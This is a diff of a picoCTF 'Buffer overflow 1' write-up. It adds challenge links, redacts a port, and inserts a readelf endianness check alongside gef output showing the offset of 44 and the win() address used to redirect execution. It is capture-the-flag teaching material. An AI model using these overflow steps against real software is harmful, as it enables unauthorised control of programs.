@@ -1,8 +1,8 @@
 # picoCTF: Buffer overflow 1
 ### Description
 Control the return address \
-Now we're cooking! You can overflow the buffer and return to the flag function in the program. \
-You can view source here. And connect with it using `nc saturn.picoctf.net 61265`
+Now we're cooking! You can overflow the buffer and return to the flag function in the  [program](https://artifacts.picoctf.net/c/253/vuln). \
+You can view source [here](https://artifacts.picoctf.net/c/253/vuln.c). And connect with it using  `nc saturn.picoctf.net [PORT_REDACTED]`
 
 ### Detailed Solution
 Let's check out our source code:
@@ -148,7 +148,13 @@ gef➤  pattern search 0x6161616c
 [+] Found at offset 44 (little-endian search) likely
 [+] Found at offset 41 (big-endian search)
 ```
-Since this binary is little-endian (bytes are in reverse), we know that 44 `A`s are needed in order to reach the `$eip`. The only thing we need now before we create our exploit is the address of the function we need to jump to in order to get the flag. This would be `win()`:
+To figure out which offset we need to use, we can use `readelf` to analyze header of the `vuln` executable:
+```
+kali@kali:~/pico22/buffer-overflow-1$ readelf -h vuln | grep endian
+  Data:                              2's complement, little endian
+
+```
+Our binary is in little endian, we know that 44 `A`s are needed in order to reach the `$eip`. The only thing we need now before we create our exploit is the address of the function we need to jump to in order to get the flag. This would be `win()`:
 ```
 gef➤  x win
 0x80491f6 <win>:	0xfb1e0ff3
